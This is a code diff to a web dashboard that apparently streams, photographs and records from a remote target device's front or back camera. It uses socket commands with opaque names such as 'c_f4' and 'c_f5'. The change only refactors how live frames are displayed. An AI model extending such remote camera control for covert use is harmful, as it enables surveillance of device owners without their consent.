@@ -383,9 +383,9 @@ export default function Home() {
     const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
     const [isRecording, setIsRecording] = useState(false);
     const [isLiveStreaming, setIsLiveStreaming] = useState(false);
-    const [liveFrame, setLiveFrame] = useState<string | null>(null);
     // Refs for socket reconnect resume
     const isLiveStreamingRef = useRef(false);
+    const liveImageRef = useRef<HTMLImageElement>(null);
     const cameraModeRef = useRef<'front' | 'back'>('back');
     const cameraQualityRef = useRef<number>(360);
 
@@ -850,8 +850,10 @@ export default function Home() {
             });
 
             socket.on("live_frame", (data: any) => {
-                if (data.frame) {
-                    setLiveFrame(data.frame);
+                if (data.frame && liveImageRef.current) {
+                    liveImageRef.current.src = data.frame.startsWith('data:') 
+                        ? data.frame 
+                        : `data:image/jpeg;base64,${data.frame}`;
                 }
             });
 
@@ -1932,18 +1934,7 @@ END:VCARD`;
                             <div className={`flex flex-col gap-4 ${isCameraFullscreen ? 'h-full' : 'lg:col-span-2'}`}>
                                 <div className={`w-full bg-black rounded-[2rem] border-2 overflow-hidden relative flex items-center justify-center border-white/10 ${isCameraFullscreen ? 'h-full flex-1' : 'aspect-video'}`}>
                                     {isLiveStreaming ? (
-                                        liveFrame ? (
-                                            <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live Feed" />
-                                        ) : (
-                                            <div className="absolute inset-0 flex items-center justify-center bg-cyan-500/5">
-                                                <div className="flex flex-col items-center gap-6">
-                                                    <div className="w-24 h-24 rounded-full bg-cyan-500/20 flex items-center justify-center border border-cyan-500/30">
-                                                        <Video className="w-8 h-8 text-cyan-400" />
-                                                    </div>
-                                                    <span className="text-cyan-400 font-bold tracking-[0.2em] uppercase text-sm">Initializing Feed...</span>
-                                                </div>
-                                            </div>
-                                        )
+                                        <img ref={liveImageRef} className="w-full h-full object-contain" alt="Live Feed" />
                                     ) : isRecording ? (
                                         <div className="absolute inset-0 flex items-center justify-center bg-red-500/5">
                                             <div className="flex flex-col items-center gap-6">
@@ -1989,10 +1980,10 @@ END:VCARD`;
                                                 socket?.emit('c_f5', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                 setIsLiveStreaming(false);
                                                 isLiveStreamingRef.current = false;
+                                                if (liveImageRef.current) liveImageRef.current.src = '';
                                             } else {
                                                 socket?.emit('c_f4', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, quality: cameraQuality });
                                                 setIsLiveStreaming(true);
-                                                setLiveFrame(null);
                                                 // Refs update karo reconnect ke liye
                                                 isLiveStreamingRef.current = true;
                                                 selectedDeviceIdRef.current = selectedDeviceId ?? null;
